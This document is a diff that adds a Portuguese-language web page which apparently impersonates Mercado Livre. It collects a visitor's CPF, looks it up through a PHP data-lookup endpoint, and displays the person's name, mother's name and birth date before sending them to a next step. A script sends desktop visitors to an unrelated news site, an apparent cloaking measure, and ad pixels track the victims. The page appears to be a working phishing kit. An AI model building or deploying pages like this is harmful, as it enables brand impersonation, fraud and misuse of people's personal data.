@@ -1,0 +1,332 @@
+﻿<html lang="pt-BR">
+
+<head>
+ 
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <link rel="stylesheet" href="css/all.min-2.css">
+  <title>Análise de Cartão</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      color: #333;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      border-bottom: 1px solid #aa9900;
+      background-color: #FFE600;
+    }
+
+    .header img {
+      width: 125px;
+      padding: 10px;
+    }
+
+    .logo {
+      margin-left: 20px;
+    }
+
+    .content {
+      margin: 0 auto;
+      padding: 10px 20px 30px 20px;
+      margin: 0px 15px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      background-color: #ffffff;
+      margin-top: 20px;
+    }
+
+    h1 {
+      font-family: 'Sora', sans-serif;
+      color: #333;
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
+    .cpf-input {
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      box-sizing: border-box;
+    }
+
+    .button {
+      background-color: #FFE600;
+      color: #1c1c1c;
+      padding: 15px 30px;
+      border-radius: 10px;
+      font-family: 'Sora', sans-serif;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      text-decoration: none;
+      display: inline-block;
+      text-align: center;
+      box-sizing: border-box;
+      border: none;
+    }
+
+    .button2 {
+      background-color: #FFE600;
+      color: #1c1c1c;
+      padding: 15px 30px;
+      border-radius: 10px;
+      font-family: 'Sora', sans-serif;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      text-decoration: none;
+      display: inline-block;
+      text-align: center;
+      box-sizing: border-box;
+      border: none;
+    }
+
+    .button:hover {
+      background-color: #e6cf00;
+    }
+
+    label {
+      font-family: 'Sora', sans-serif;
+      color: #666;
+      font-size: 16px;
+      display: block;
+      margin-bottom: 10px;
+    }
+
+    .notification-card {
+      background-color: #ffeded;
+      border: 1px solid #ff5252;
+      color: #ff5252;
+      padding: 15px 20px;
+      border-radius: 8px;
+      font-family: 'Sora', sans-serif;
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+      display: none;
+    }
+
+    .notification-card i {
+      margin-right: 10px;
+      font-size: 18px;
+    }
+  </style>
+
+
+
+<script type="text/javascript">
+    // Verifica o dispositivo e redireciona antes de carregar outros recursos
+    if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+      window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+    }
+  </script>
+  <script>
+  window.pixelId = "6903840b1d5bdac30702fe0f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+<script>
+  window.pixelId = "6903840b1d5bdac30702fe0f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.tikTokPixelId = "69ef9622c928c0ab98c3bffc";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+</head>
+
+<body>
+  <div class="header">
+    <img src="images/logo.png" alt="Logo Mercado Livre" class="logo">
+  </div>
+
+  <div class="content">
+    <div id="primeiraParte">
+      <h1>Preencha seus dados para cadastro</h1>
+
+      <label for="cpf">CPF</label>
+      <input type="text" id="cpf" class="cpf-input" placeholder="000.000.000-00" maxlength="14">
+
+      <div id="notification" class="notification-card">
+        <i class="fas fa-exclamation-circle"></i>
+        <span id="notification-message"></span>
+      </div>
+
+      <button class="button2" id="consultarBtn" onclick="this.innerHTML = '<i class=\'fas fa-spinner fa-spin\' style=\'margin-right: 10px;\'></i>Realizando cadastro'">Continuar</button>
+    </div>
+
+    <div id="resultadoModal" style="display: none;">
+      <div style="text-align: center; margin-bottom: 20px; margin-top: 20px;">
+        <svg width="40" height="40" viewbox="0 0 40 40">
+          <circle cx="20" cy="20" r="19" fill="#4CAF50" stroke="#45a049" stroke-width="2"></circle>
+          <path d="M12 20l6 6 12-12" stroke="white" stroke-width="3" fill="none"></path>
+        </svg>
+        <h3 style="color: #4CAF50; margin: 10px 0;">Dados encontrados com sucesso!</h3>
+      </div>
+
+      <div id="dadosContainer" style="font-family: 'Sora', sans-serif;">
+        <p><strong>Nome:</strong> <span id="nomeResult"></span></p>
+        <p id="maeContainer" style="display: none;"><strong>Nome da Mãe:</strong> <span id="maeResult"></span></p>
+        
+        <p><strong>Data de Nascimento:</strong> <span id="nascimentoResult"></span></p>
+      </div>
+
+      <button class="button" onclick="window.location.href = '/online/5/index.html'">
+        Continuar
+      </button>
+    </div>
+
+  <script>
+    // Função para mostrar notificação (mantida do seu código)
+    function showNotification(message) {
+        const notification = document.getElementById('notification');
+        const notificationMessage = document.getElementById('notification-message');
+
+        if (notification && notificationMessage) {
+            notificationMessage.textContent = message;
+            notification.style.display = 'flex';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        } else {
+            console.warn("Notification elements not found. Using alert for: " + message);
+            alert(message);
+        }
+    }
+
+    document.getElementById('consultarBtn').addEventListener('click', async function () {
+        const cpfInput = document.getElementById('cpf');
+        const consultarBtn = document.getElementById('consultarBtn');
+
+        if (!cpfInput || !consultarBtn) {
+            console.error("CPF input or consultation button not found.");
+            showNotification("Erro de configuração da página. Por favor, tente mais tarde.");
+            return;
+        }
+
+        const cpf = cpfInput.value.replace(/\D/g, '');
+        const originalButtonText = consultarBtn.textContent;
+        consultarBtn.innerHTML = '<span class="loading-spinner"></span> Consultando...';
+        consultarBtn.disabled = true;
+
+        console.log('CPF inserido para consulta:', cpf);
+
+        if (cpf.length !== 11) {
+            console.log('CPF inválido - comprimento incorreto');
+            showNotification('Por favor, insira um CPF válido com 11 dígitos.');
+            consultarBtn.innerHTML = originalButtonText;
+            consultarBtn.disabled = false;
+            return;
+        }
+
+        try {
+            console.log('Iniciando consulta via getCpfDataMagma.php...');
+            const seuScriptPhpUrl = `/getCpfDataMagma.php?cpf_consulta=${encodeURIComponent(cpf)}`;
+            console.log('URL da requisição para seu PHP:', seuScriptPhpUrl);
+
+            const response = await fetch(seuScriptPhpUrl, {
+                method: 'GET',
+                headers: { 'Accept': 'application/json' }
+            });
+
+            console.log('Status da resposta do seu PHP:', response.status);
+            
+            let data;
+            const responseText = await response.text();
+            try {
+                data = JSON.parse(responseText);
+            } catch (e) {
+                console.error('Falha ao fazer parse do JSON da resposta do PHP:', responseText, e);
+                throw new Error('Formato de resposta inválido do servidor.');
+            }
+            
+            console.log('Dados recebidos do seu PHP (MagmaDataHub):', data);
+
+            // CONDIÇÃO AJUSTADA AQUI para checar data.nome (minúsculo)
+            if (response.ok && data && !data.error && data.cpf && data.nome) { 
+                console.log('Consulta via PHP bem sucedida e dados válidos recebidos.');
+
+                // MAPEAMENTO DOS DADOS AQUI para NOME, MAE, etc. em maiúsculas
+                const dadosUsuario = {
+                    NOME: data.nome,         // usa data.nome (minúsculo)
+                    MAE: data.nome_mae || '',// usa data.nome_mae (minúsculo)
+                    SEXO: data.sexo,         // usa data.sexo (minúsculo)
+                    NASCIMENTO: data.nascimento // usa data.nascimento (minúsculo)
+                };
+
+                localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
+                console.log('Dados (dadosUsuario) salvos no localStorage:', dadosUsuario);
+
+                // Preencher dados no modal
+                const nomeResultEl = document.getElementById('nomeResult');
+                const maeResultEl = document.getElementById('maeResult');
+                const maeContainerEl = document.getElementById('maeContainer');
+                const sexoResultEl = document.getElementById('sexoResult');
+                const nascimentoResultEl = document.getElementById('nascimentoResult');
+                const resultadoModalEl = document.getElementById('resultadoModal');
+                const primeiraParteEl = document.getElementById('primeiraParte');
+
+                if (nomeResultEl) nomeResultEl.textContent = dadosUsuario.NOME;
+                
+                if (maeContainerEl) { 
+                    if (dadosUsuario.MAE && dadosUsuario.MAE.trim() !== '' && maeResultEl) {
+                        maeResultEl.textContent = dadosUsuario.MAE;
+                        maeContainerEl.style.display = 'block';
+                    } else {
+                        maeContainerEl.style.display = 'none';
+                    }
+                }
+                
+                if (sexoResultEl) sexoResultEl.textContent = dadosUsuario.SEXO;
+                if (nascimentoResultEl) nascimentoResultEl.textContent = dadosUsuario.NASCIMENTO;
+
+                if (resultadoModalEl) resultadoModalEl.style.display = 'block';
+                if (primeiraParteEl) primeiraParteEl.style.display = 'none';
+                console.log('Modal exibido com sucesso com dados da consulta.');
+            
+            } else {
+                const errorMessage = (data && (data.message || data.msg)) || 'CPF não encontrado ou dados indisponíveis. Tente novamente.';
+                console.log('Consulta ao CPF falhou ou dados incompletos:', errorMessage, data);
+                showNotification(errorMessage); 
+            }
+        } catch (error) {
+            console.error('Erro detalhado na consulta:', error);
+            if(error.stack) console.error('Stack trace:', error.stack);
+            showNotification('Erro ao consultar CPF. Tente novamente mais tarde.');
+        } finally {
+            consultarBtn.innerHTML = originalButtonText;
+            consultarBtn.disabled = false;
+        }
+    });
+</script>
+
+</body>
+
+</html>
